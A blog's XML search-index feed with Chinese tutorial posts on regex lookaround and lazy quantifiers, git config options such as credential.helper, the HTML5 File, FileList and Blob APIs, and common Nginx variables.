<tr>
<td></td>
<td>(?&lt;=exp)</td>
<td>匹配exp后面的位置</td>
</tr>
<tr>
<td></td>
<td>(?!exp)</td>
<td>匹配后面跟的不是exp的位置</td>
</tr>
<tr>
<td></td>
<td>(?&lt;!exp)</td>
<td>匹配前面不是exp的位置</td>
</tr>
<tr>
<td>注释</td>
<td>(?#comment)</td>
<td>这种类型的分组不对正则表达式的处理产生任何影响，用于提供注释让人阅读</td>
</tr>
</tbody>
</table>
<p>我们已经讨论了前两种语法。第三个<code>(?:exp)</code>不会改变正则表达式的处理方式，只是这样的组匹配的内容不会像前两种那样被捕获到某个组里面，也不会拥有组号。“我为什么会想要这样做？”——好问题，你觉得为什么呢？</p>
<h2 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h2><p>接下来的四个用于查找在某些内容(但并不包括这些内容)之前或之后的东西，也就是说它们像<code>\b</code>,<code>^</code>,<code>$</code>那样用于指定一个位置，这个位置应该满足一定的条件(即断言)，因此它们也被称为零宽断言。最好还是拿例子来说明吧：</p>
<p><code>(?=exp)</code>也叫零宽度正预测先行断言，它断言自身出现的位置的后面能匹配表达式exp。比如<code>\b\w+(?=ing\b)</code>，匹配以<code>ing</code>结尾的单词的前面部分(除了<code>ing</code>以外的部分)，如查找<code>I&#39;m singing while you&#39;re dancing.</code>时，它会匹配<code>sing</code>和<code>danc</code>。</p>
<p><code>(?&lt;=exp)</code>也叫零宽度正回顾后发断言，它断言自身出现的位置的前面能匹配表达式exp。比如<code>(?&lt;=\bre)\w+\b</code>会匹配以<code>re</code>开头的单词的后半部分(除了<code>re</code>以外的部分)，例如在查找<code>reading a book</code>时，它匹配<code>ading</code>。</p>
<p>假如你想要给一个很长的数字中每三位间加一个逗号(当然是从右边加起了)，你可以这样查找需要在前面和里面添加逗号的部分：<code>((?&lt;=\d)\d{3})+\b</code>，用它对<code>1234567890</code>进行查找时结果是<code>234567890</code>。</p>
<p>下面这个例子同时使用了这两种断言：<code>(?&lt;=\s)\d+(?=\s)</code>匹配以空白符间隔的数字(再次强调，不包括这些空白符)。</p>
<h2 id="负向零宽断言"><a href="#负向零宽断言" class="headerlink" title="负向零宽断言"></a>负向零宽断言</h2><p>前面我们提到过怎么查找不是某个字符或不在某个字符类里的字符的方法(反义)。但是如果我们只是想要确保某个字符没有出现，但并不想去匹配它时怎么办？例如，如果我们想查找这样的单词–它里面出现了字母<code>q</code>,但是q后面跟的不是字母<code>u</code>,我们可以尝试这样：</p>
<p><code>\b\w*q[^u]\w*\b</code>匹配包含后面不是字母<code>u</code>的字母<code>q</code>的单词。但是如果多做测试(或者你思维足够敏锐，直接就观察出来了)，你会发现，如果<code>q</code>出现在单词的结尾的话，像<code>Iraq</code>,<code>Benq</code>，这个表达式就会出错。这是因为<code>[^u]</code>总要匹配一个字符，所以如果<code>q</code>是单词的最后一个字符的话，后面的<code>[^u]</code>将会匹配q后面的单词分隔符(可能是空格，或者是句号或其它的什么)，后面的\w<em>\b将会匹配下一个单词，于是`\b\w</em>q[^u]\w<em>\b<code>就能匹配整个</code>Iraq fighting<code>。负向零宽断言能解决这样的问题，因为它只匹配一个位置，并不消费任何字符。现在，我们可以这样来解决这个问题：</code>\b\w</em>q(?!u)\w*\b`。</p>
<p>零宽度负预测先行断言<code>(?!exp)</code>，断言此位置的后面不能匹配表达式<code>exp</code>。例如：<code>\d{3}(?!\d)</code>匹配三位数字，而且这三位数字的后面不能是数字；<code>\b((?!abc)\w)+\b</code>匹配不包含连续字符串abc的单词。</p>
<p>同理，我们可以用<code>(?&lt;!exp)</code>,零宽度负回顾后发断言来断言此位置的前面不能匹配表达式<code>exp：(?&lt;![a-z])\d{7}</code>匹配前面不是小写字母的七位数字。</p>
<p>一个更复杂的例子：<code>(?&lt;=&lt;(\w+)&gt;).*(?=&lt;\/\1&gt;)</code>匹配不包含属性的简单HTML标签内里的内容。<code>(?&lt;=&lt;(\w+)&gt;)</code>指定了这样的前缀：被尖括号括起来的单词(比如可能是<b>)，然后是<code>.*</code>(任意的字符串),最后是一个后缀<code>(?=&lt;\/\1&gt;)</code>。注意后缀里的<code>\/</code>，它用到了前面提过的字符转义；<code>\1</code>则是一个反向引用，引用的正是捕获的第一组，前面的<code>(\w+)</code>匹配的内容，这样如果前缀实际上是<code>&lt;b&gt;</code>的话，后缀就是<code>&lt;/b&gt;</code>了。整个表达式匹配的是<code>&lt;b&gt;</code>和<code>&lt;/b&gt;</code>之间的内容(再次提醒，不包括前缀和后缀本身)。</b></p>
<blockquote>
<p>请详细分析表达式<code>(?&lt;=&lt;(\w+)&gt;).*(?=&lt;\/\1&gt;)</code>，这个表达式最能表现零宽断言的真正用途。</p>
</blockquote>
<h2 id="贪婪与懒惰"><a href="#贪婪与懒惰" class="headerlink" title="贪婪与懒惰"></a>贪婪与懒惰</h2><p>当正则表达式中包含能接受重复的限定符时，通常的行为是（在使整个表达式能得到匹配的前提下）匹配尽可能多的字符。以这个表达式为例：<code>a.*b</code>，它将会匹配最长的以<code>a</code>开始，以<code>b</code>结束的字符串。如果用它来搜索<code>aabab</code>的话，它会匹配整个字符串<code>aabab</code>。这被称为贪婪匹配。</p>
<p>有时，我们更需要懒惰匹配，也就是匹配尽可能少的字符。前面给出的限定符都可以被转化为懒惰匹配模式，只要在它后面加上一个问号<code>?</code>。这样<code>.*?</code>就意味着匹配任意数量的重复，但是在能使整个匹配成功的前提下使用最少的重复。现在看看懒惰版的例子吧：</p>
<p><code>a.*?b</code>匹配最短的，以<code>a</code>开始，以<code>b</code>结束的字符串。如果把它应用于<code>aabab</code>的话，它会匹配<code>aab</code>（第一到第三个字符）和<code>ab</code>（第四到第五个字符）。</p>
<p>表5、懒惰限定符</p>
<table>
<thead>
<tr>
<th>代码/语法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>*?</td>
<td>重复零次或更多次，但尽可能少重复</td>
</tr>
<tr>
<td>+?</td>
<td>重复一次或更多次，但尽可能少重复</td>
</tr>
<tr>
<td>??</td>
<td>重复零次或一次，但尽可能少重复</td>
</tr>
<tr>
<td>{n,}?</td>
<td>重复n次或更多次，但尽可能少重复</td>
</tr>
<tr>
<td>{n,m}?</td>
<td>重复n到m次，但尽可能少重复</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>Git-git配置项</title>
    <url>/2018/04/17/Git-git%E9%85%8D%E7%BD%AE%E9%A1%B9/</url>
    <content><![CDATA[<h2 id="git-config-配置项"><a href="#git-config-配置项" class="headerlink" title="git config 配置项"></a>git config 配置项</h2><h4 id="core-autocrlf"><a href="#core-autocrlf" class="headerlink" title="core.autocrlf"></a>core.autocrlf</h4><p>是否自动将 LF 转换为 CRLF，当 git 提示 <code>warning: LF will be replaced by CRLF</code> 时，可以将该选项设为 <code>false</code> 关闭提示。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config core.autocrlf <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h4 id="core-filemode"><a href="#core-filemode" class="headerlink" title="core.filemode"></a>core.filemode</h4><p>是否忽略文件权限</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 忽略文件全向</span></span><br><span class="line">git config core.filemode <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h4 id="credential-helper"><a href="#credential-helper" class="headerlink" title="credential.helper"></a>credential.helper</h4><p>认证助手，当我们使用HTTPS方式clone项目时，每次 pull、push 都会提示输入密码，为了不每次都输入密码，就需要配置 <code>credential.helper</code> 选项。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cache 将凭据存储在内存中</span></span><br><span class="line">git config credential.helper cache</span><br><span class="line"><span class="comment"># store 将凭据保存在磁盘上</span></span><br><span class="line">git config credential.helper store</span><br></pre></td></tr></table></figure>
<p>操作步骤如下：</p>
<h6 id="在家目录创建并编辑-git-credentials-文件"><a href="#在家目录创建并编辑-git-credentials-文件" class="headerlink" title="在家目录创建并编辑 .git-credentials 文件"></a>在家目录创建并编辑 .git-credentials 文件</h6><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">touch .git-credentials</span><br><span class="line">vim .git-credentials</span><br></pre></td></tr></table></figure>
<h6 id="把如下内容写入-git-credentials文件中，保存并退出"><a href="#把如下内容写入-git-credentials文件中，保存并退出" class="headerlink" title="把如下内容写入.git-credentials文件中，保存并退出"></a>把如下内容写入.git-credentials文件中，保存并退出</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># &#123;username&#125; 你的git账户名</span><br><span class="line"># &#123;password&#125; 你的git密码</span><br><span class="line"># example.com 你的git仓库域名</span><br><span class="line"># 例子：https://hcysunyang:12345678@github.com</span><br><span class="line"></span><br><span class="line">https://&#123;username&#125;:&#123;password&#125;@example.com</span><br></pre></td></tr></table></figure>
<h6 id="设置凭据存储方式"><a href="#设置凭据存储方式" class="headerlink" title="设置凭据存储方式"></a>设置凭据存储方式</h6><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config credential.helper store</span><br></pre></td></tr></table></figure>
<h4 id="user-name"><a href="#user-name" class="headerlink" title="user.name"></a>user.name</h4><p>配置git用户名</p>
<h4 id="user-email"><a href="#user-email" class="headerlink" title="user.email"></a>user.email</h4><p>配置用户邮箱</p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>config</tag>
      </tags>
  </entry>
  <entry>
    <title>H5-File和FileList</title>
    <url>/2018/04/17/H5_File%E5%92%8CFileList/</url>
    <content><![CDATA[<h2 id="File-和-FileList"><a href="#File-和-FileList" class="headerlink" title="File 和 FileList"></a>File 和 FileList</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p><code>File</code> API 顾名思义，是与文件相关的API，它提供了文件信息，并允许JavaScript访问文件的内容。</p>
<p><code>File</code> API 继承了 <code>Blob</code>，如下证明：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Chrome 中</span></span><br><span class="line">File.__proto__  <span class="comment">// Blob</span></span><br></pre></td></tr></table></figure>
<h5 id="File-对象出现在哪里"><a href="#File-对象出现在哪里" class="headerlink" title="File 对象出现在哪里"></a>File 对象出现在哪里</h5><h6 id="FileList"><a href="#FileList" class="headerlink" title="FileList"></a>FileList</h6><p>通过 <code>&lt;input type=&quot;file&quot; /&gt;</code> 元素选择文件时的 <code>FileList</code> 对象访问，<code>FileList</code> 对象中的每个元素都是一个 <code>File</code> 对象实例。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"fileinput"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> input = <span class="built_in">document</span>.querySelector(<span class="string">'#fileinput'</span>)</span></span><br><span class="line"><span class="javascript">input.addEventListener(<span class="string">'change'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.files[<span class="number">0</span>]   <span class="comment">// 这就是一个 File 对象实例</span></span></span><br><span class="line"><span class="javascript">&#125;, <span class="literal">false</span>)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h6 id="DataTransfer"><a href="#DataTransfer" class="headerlink" title="DataTransfer"></a>DataTransfer</h6><p>拖放事件对象的 <code>dataTransfer.files</code> 属性中的每一个元素都是 <code>FIle</code> 对象实例。</p>
<h4 id="File-构造函数"><a href="#File-构造函数" class="headerlink" title="File 构造函数"></a>File 构造函数</h4><p><code>File</code> 是一个构造函数，使用方式如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Blob(bits, name[, options])</span><br></pre></td></tr></table></figure>
<p>参数：</p>
<ul>
<li><code>{array} bits</code> bits是一个数组，可以包含 <code>ArrayBuffer</code>、<code>ArrayBufferView</code>、<code>Blob</code> 或者 <code>DOMString</code>。</li>
<li><code>{string} name</code> 文件的名字或者路径</li>
<li><code>{object} options</code> 用来设置文件属性的选项，有两个值可以设置：<code>type</code> 和 <code>lastModified</code><ul>
<li><code>{string} type</code> 内容的 <code>MIME type</code>。</li>
<li><code>{number} lastModified</code> 最后的修改时间，毫秒数。</li>
</ul>
</li>
</ul>
<p>示例：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 验证 File 继承 Blob</span></span><br><span class="line"><span class="keyword">var</span> file = <span class="keyword">new</span> File([<span class="string">"foo"</span>], <span class="string">"foo.txt"</span>, &#123;</span><br><span class="line">  type: <span class="string">"text/plain"</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">file <span class="keyword">instanceof</span> Blob    <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
<h5 id="File-对象的属性"><a href="#File-对象的属性" class="headerlink" title="File 对象的属性"></a>File 对象的属性</h5><p><code>File</code> 继承了 <code>Blob</code>，所以 <code>File</code> 示例对象的属性中包含继承自 <code>Blob</code> 的属性，比如：<code>size</code> 和 <code>type</code>。</p>
<h6 id="lastModified"><a href="#lastModified" class="headerlink" title="lastModified"></a>lastModified</h6><ul>
<li><code>{Number} lastModified</code> 文件的最后修改时间，毫秒数</li>
</ul>
<h6 id="lastModified-1"><a href="#lastModified-1" class="headerlink" title="lastModified"></a>lastModified</h6><ul>
<li><code>{Date} lastModifiedDate</code> 文件的最后修改日期</li>
</ul>
<h6 id="name"><a href="#name" class="headerlink" title="name"></a>name</h6><ul>
<li><code>{string} name</code> 文件的名称</li>
</ul>
<h6 id="size"><a href="#size" class="headerlink" title="size"></a>size</h6><ul>
<li><code>{number} size</code> 文件的尺寸</li>
</ul>
<h6 id="type"><a href="#type" class="headerlink" title="type"></a>type</h6><ul>
<li><code>{string} type</code> 文件的 <code>MIME type</code></li>
</ul>
<h6 id="webkitRelativePath"><a href="#webkitRelativePath" class="headerlink" title="webkitRelativePath"></a>webkitRelativePath</h6><ul>
<li><code>{string} webkitRelativePath</code> 文件的相对路径</li>
</ul>
<h5 id="File-对象的方法"><a href="#File-对象的方法" class="headerlink" title="File 对象的方法"></a>File 对象的方法</h5><p><code>File</code> 实例有三个方法，不过都不是标准的(Non-standard)，且已经不推荐使用了。推荐使用 <code>FileReader</code> 实例对象的对用方法替代：</p>
<h6 id="getAsBinary"><a href="#getAsBinary" class="headerlink" title="getAsBinary()"></a>getAsBinary()</h6><p>使用 <code>FileReader</code> 对象的 <code>readAsBinaryString()</code> 代替</p>
<h6 id="getAsDataURL"><a href="#getAsDataURL" class="headerlink" title="getAsDataURL()"></a>getAsDataURL()</h6><p>使用 <code>FileReader</code> 对象的 <code>readAsDataURL()</code> 代替</p>
<h6 id="getAsText"><a href="#getAsText" class="headerlink" title="getAsText()"></a>getAsText()</h6><p>使用 <code>FileReader</code> 对象的 <code>readAsText()</code> 代替</p>
<h2 id="FileList-1"><a href="#FileList-1" class="headerlink" title="FileList"></a>FileList</h2><p><code>FileList</code> 对象是一个类数组对象，拥有 <code>length</code> 属性，对象的每个元素都是一个 <code>File</code> 对象实例，比如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"fileinput"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> input = <span class="built_in">document</span>.querySelector(<span class="string">'#fileinput'</span>)</span></span><br><span class="line"><span class="javascript">input.addEventListener(<span class="string">'change'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.files      <span class="comment">// 这就是一个 FileList 对象实例</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.files[<span class="number">0</span>]   <span class="comment">// 这就是一个 File 对象实例</span></span></span><br><span class="line"><span class="javascript">&#125;, <span class="literal">false</span>)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中 <code>this.files</code> 就是一个 FileList 对象实例，可以想数组一样访问其元素 <code>this.files[0]</code>，代表一个 <code>File</code> 对象实例。</p>
<p>也可以通过 <code>this.files.item(0)</code> 来访问其元素。</p>
]]></content>
      <categories>
        <category>H5</category>
      </categories>
      <tags>
        <tag>H5</tag>
        <tag>File</tag>
        <tag>FileList</tag>
      </tags>
  </entry>
  <entry>
    <title>H5常用的新标签</title>
    <url>/2018/04/17/H5_H5%E5%B8%B8%E7%94%A8%E7%9A%84%E6%96%B0%E6%A0%87%E7%AD%BE/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>H5</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>H5</tag>
        <tag>新标签</tag>
      </tags>
  </entry>
  <entry>
    <title>H5-Blob（binary_large_object）</title>
    <url>/2018/04/17/H5_Blob%EF%BC%88binary-large-object%EF%BC%89/</url>
    <content><![CDATA[<h2 id="blob"><a href="#blob" class="headerlink" title="blob"></a>blob</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Blob的全称为 <code>binary large object</code> 即 二进制大对象，它是计算机界的通用术语，主要是用来存放和操作二进制数据的。在 <code>javascript</code> 中，我们可以通过 <code>Blob</code> 构造函数，创建一个 <code>Blob</code> 对象。<code>Blob</code> 是很底层的API，<code>File</code> API就是基于 <code>Blob</code> 的。<code>Blob</code> 是一个很有用的东东，正是因为有了 <code>Blob</code> 我们才可以分割文件进行分段上传，才可以 <code>创建Blob网址</code>。</p>
<p>浏览器兼容性如下(截止到2017-08-02)：</p>
<p><img src="/static/img/blob-jr.png" width="800"></p>
<p><a href="http://caniuse.com/#search=Blob" target="_blank" rel="noopener">可以点击这里查看最新的浏览器兼容情况</a></p>
<h4 id="Blob-构造函数"><a href="#Blob-构造函数" class="headerlink" title="Blob 构造函数"></a>Blob 构造函数</h4><p><code>Blob</code>是一个构造函数，使用方式如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Blob([array[, options]])</span><br></pre></td></tr></table></figure>
<p>两个参数都是可选的：</p>
<ul>
<li><p><code>array</code> 参数是一个数组，数组的元素可以是 <code>ArrayBuffer</code>, <code>ArrayBufferView</code>, <code>Blob</code>, <code>DOMString</code> 这些对象。</p>
</li>
<li><p><code>options</code> 参数是一个对象，用来对 <code>Blob</code> 进行设置，其中有两个选项可写：</p>
<ul>
<li><code>type</code> 默认值是空字符串，相当于 <code>MIME type</code>，指定 <code>Blob</code> 的类型</li>
<li><code>endings</code> 它指定如何写出包含行结束字符\ n的字符串，默认值是 <code>transparent</code>，这意味着结尾存储在blob中，不会改变。也可指定 <code>native</code>，根据操作系统的文件系统的约定而改变。</li>
</ul>
</li>
</ul>
<h5 id="Blob-对象的属性"><a href="#Blob-对象的属性" class="headerlink" title="Blob 对象的属性"></a>Blob 对象的属性</h5><h6 id="size"><a href="#size" class="headerlink" title="size"></a>size</h6><ul>
<li><code>{Number} size</code> Blob对象包含数据的尺寸，字节数</li>
<li>示例：</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> Blob([<span class="string">'I love you'</span>])</span><br><span class="line">b.size  <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<h6 id="type"><a href="#type" class="headerlink" title="type"></a>type</h6><ul>
<li><code>{String} type</code> 返回一个 <code>MIME type</code> 字符串，代表 <code>Blob</code> 中数据的类型</li>
</ul>
<h5 id="Blob-对象的方法"><a href="#Blob-对象的方法" class="headerlink" title="Blob 对象的方法"></a>Blob 对象的方法</h5><h6 id="slice-start-end-contentType"><a href="#slice-start-end-contentType" class="headerlink" title="slice([start [, end [, contentType]]])"></a>slice([start [, end [, contentType]]])</h6><ul>
<li><p>描述：从已有的 <code>Blob</code> 对象创建一个新的 <code>Blob</code> 对象</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{start} number</code> 起始位置，如果传递负数则倒数，如果传递的数值大于原 <code>Blob</code> 对象的尺寸则返回一个空 <code>Blob</code> 对象，默认值是 0。</li>
<li><code>{end} number</code> 结束位置，不包含该位置，如果传递负数则倒数，默认值是等于 <code>size</code> 属性的值，即结束位置。</li>
<li><code>{contentType}</code> 指定新 <code>Blob</code> 对象的 <code>MIME type</code>，默认值为空字符串</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Blob}</code> 新的 <code>Blob</code> 对象</li>
</ul>
</li>
</ul>
<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>预览 PDF 文件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"fileinput"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">"width: 700px; height: 400px;"</span> <span class="attr">id</span>=<span class="string">"viewer"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> input = <span class="built_in">document</span>.querySelector(<span class="string">'#fileinput'</span>)</span></span><br><span class="line"><span class="javascript">    input.addEventListener(<span class="string">'change'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 其中 this.files[0] 为 File 的实例，但 File 继承 Blob</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> obj_url = <span class="built_in">window</span>.URL.createObjectURL(<span class="keyword">this</span>.files[<span class="number">0</span>])</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> iframe = <span class="built_in">document</span>.querySelector(<span class="string">'viewer'</span>)</span></span><br><span class="line"><span class="javascript">        iframe.setAttribute(<span class="string">'src'</span>, obj_url)</span></span><br><span class="line"><span class="javascript">        iframe.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.URL.revokeObjectURL(obj_url)</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">    &#125;, <span class="literal">false</span>)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>效果如下：</p>
<p><img src="/static/img/showpdf.gif" width="700"></p>
<p>注意：</p>
<p>以上代码在火狐(53.0.3)中可以在本地环境运行，在Chrome(59.0.3071.115)和Safari中必须要在服务器环境下，才能正常运行。</p>
<p>值得关注的是，除此应用之外，由于 <code>File</code> API继承且基于 <code>Blob</code>，所以对于 <code>File</code> 的应用，也算是对 <code>Blob</code> 的应用。</p>
]]></content>
      <categories>
        <category>H5</category>
      </categories>
      <tags>
        <tag>H5</tag>
        <tag>Blob</tag>
      </tags>
  </entry>
  <entry>
    <title>html全局属性（global_attribute）</title>
    <url>/2018/04/17/HTML_html%E5%85%A8%E5%B1%80%E5%B1%9E%E6%80%A7%EF%BC%88global_attribute%EF%BC%89%20/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>HTML</tag>
        <tag>全局属性</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx常用变量</title>
    <url>/2019/10/25/Nginx_Nginx%E5%B8%B8%E7%94%A8%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<h2 id="Nginx常用变量"><a href="#Nginx常用变量" class="headerlink" title="Nginx常用变量"></a>Nginx常用变量</h2><h3 id="arg-PARAMETER"><a href="#arg-PARAMETER" class="headerlink" title="$arg_PARAMETER"></a>$arg_PARAMETER</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这个变量包含在查询字符串时GET请求PARAMETER的值</span><br></pre></td></tr></table></figure>
<h3 id="args"><a href="#args" class="headerlink" title="$args"></a>$args</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这个变量等于请求行中的参数(uri参数)</span><br></pre></td></tr></table></figure>
<h3 id="binary-remote-addr"><a href="#binary-remote-addr" class="headerlink" title="$binary_remote_addr"></a>$binary_remote_addr</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">二进制码形式的客户端地址</span><br></pre></td></tr></table></figure>
<h3 id="body-bytes-sent"><a href="#body-bytes-sent" class="headerlink" title="$body_bytes_sent"></a>$body_bytes_sent</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">传送页面的字节数</span><br></pre></td></tr></table></figure>
<h3 id="content-length"><a href="#content-length" class="headerlink" title="$content_length"></a>$content_length</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">请求头中的Content-length字段</span><br></pre></td></tr></table></figure>
<h3 id="content-type"><a href="#content-type" class="headerlink" title="$content_type"></a>$content_type</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">请求头中的Content-Type字段</span><br></pre></td></tr></table></figure>
<h3 id="cookie-COOKIE"><a href="#cookie-COOKIE" class="headerlink" title="$cookie_COOKIE"></a>$cookie_COOKIE</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cookie COOKIE的值</span><br></pre></td></tr></table></figure>
<h3 id="document-uri"><a href="#document-uri" class="headerlink" title="$document_uri"></a>$document_uri</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">与$uri相同,获取uri,这个uri不带有参数,如果想要完整的带有参数的uri,请使用$request_uri</span><br></pre></td></tr></table></figure>
<h3 id="host"><a href="#host" class="headerlink" title="$host"></a>$host</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">请求中的主机头字段,如果请求中的主机头不可用,则为服务器处理请求的服务器名称.</span><br></pre></td></tr></table></figure>
<h3 id="nginx-version"><a href="#nginx-version" class="headerlink" title="$nginx_version"></a>$nginx_version</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前运行的nginx版本号</span><br></pre></td></tr></table></figure>
<h3 id="query-string"><a href="#query-string" class="headerlink" title="$query_string"></a>$query_string</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">与$args相同,都是获取所有uri参数</span><br></pre></td></tr></table></figure>
<h3 id="remote-addr"><a href="#remote-addr" class="headerlink" title="$remote_addr"></a>$remote_addr</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端的ip地址</span><br></pre></td></tr></table></figure>
<h3 id="remote-user"><a href="#remote-user" class="headerlink" title="$remote_user"></a>$remote_user</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过Auth Basic Module验证的用户名</span><br></pre></td></tr></table></figure>
<h3 id="request-filename"><a href="#request-filename" class="headerlink" title="$request_filename"></a>$request_filename</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前连接请求的文件路径,由root或alias指令与URI请求生成</span><br></pre></td></tr></table></figure>
<h3 id="request-body"><a href="#request-body" class="headerlink" title="$request_body"></a>$request_body</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端请求的请求主体信息</span><br></pre></td></tr></table></figure>
<h3 id="request-body-file"><a href="#request-body-file" class="headerlink" title="$request_body_file"></a>$request_body_file</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端请求主体信息的临时文件名</span><br></pre></td></tr></table></figure>
<h3 id="request-method"><a href="#request-method" class="headerlink" title="$request_method"></a>$request_method</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端请求的动作(方式),通常为GET或POST</span><br></pre></td></tr></table></figure>
<h3 id="request-uri"><a href="#request-uri" class="headerlink" title="$request_uri"></a>$request_uri</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取完整的uri请求.包含请求参数</span><br></pre></td></tr></table></figure>
<h3 id="scheme"><a href="#scheme" class="headerlink" title="$scheme"></a>$scheme</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP方法(如http,https),在location配置重定向的时候也许用的上,比如:</span><br><span class="line">rewrite $scheme://$http_host$request_uri</span><br></pre></td></tr></table></figure>
<h3 id="server-name"><a href="#server-name" class="headerlink" title="$server_name"></a>$server_name</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务器名称</span><br></pre></td></tr></table></figure>
<h3 id="server-addr"><a href="#server-addr" class="headerlink" title="$server_addr"></a>$server_addr</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务器地址,在完成一次系统调用后可以确定这个值,如果想要绕开系统调用,</span><br><span class="line">则必须在listen中指定地址并且使用bind参数</span><br></pre></td></tr></table></figure>
<h3 id="server-port"><a href="#server-port" class="headerlink" title="$server_port"></a>$server_port</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">请求到达服务器的端口号</span><br></pre></td></tr></table></figure>
